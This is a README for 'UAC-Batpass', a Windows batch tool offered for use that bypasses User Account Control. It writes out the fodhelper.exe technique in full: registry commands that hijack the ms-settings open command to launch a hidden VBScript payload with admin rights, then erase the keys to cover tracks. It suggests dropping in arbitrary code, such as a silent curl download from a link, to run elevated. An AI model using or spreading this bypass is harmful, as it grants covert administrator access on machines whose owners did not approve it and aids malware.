# UAC-Batpass

## Usage
* Download the newest release from [here](https://github.com/AnixDevGit/UAC-Batpass/releases)
* Replace `REM Add Your code below` from the code to what you want to be executed as admin
### Examples:
* `start C:\Path\To\Your\File`
* `curl -s -o "filename" "link"`
## How it works

This script checks if the user has admin privileges. If not, it tries to elevate itself to run as an administrator.

1. **Check Admin Access**:  
   The script runs the command:
   `net session >nul 2>&1`
   
   If this command fails (indicating the script isn't running as an admin), it moves on to elevate itself.

3. **Create Helper Files**:  
   If not an admin, the script creates two files:
   - A batch file (`help.bat`) that contains the script's path.
   - A Visual Basic script (`run.vbs`) that runs the batch file silently with elevated privileges.

4. **Set Payload**:  
   The payload (`wscript.exe %temp%\run.vbs`) is set, and the following registry keys are added to trigger the elevation process:

   `reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "%payload%" /f`
   
   `reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`

   - The first key (`ms-settings\shell\open\command`) points to the VBScript, telling Windows to run it when the registry command is triggered.
   - The second key (`DelegateExecute`) is necessary to ensure `fodhelper.exe` executes the payload with elevated privileges.

6. **Elevate Process**:  
   The script runs:

  `start fodhelper.exe`

   This triggers the registry command, causing the batch file to execute with admin rights.

6. **Clean Up**:  
   After a short delay, the script deletes the registry entries it created to clean up:

   `reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`
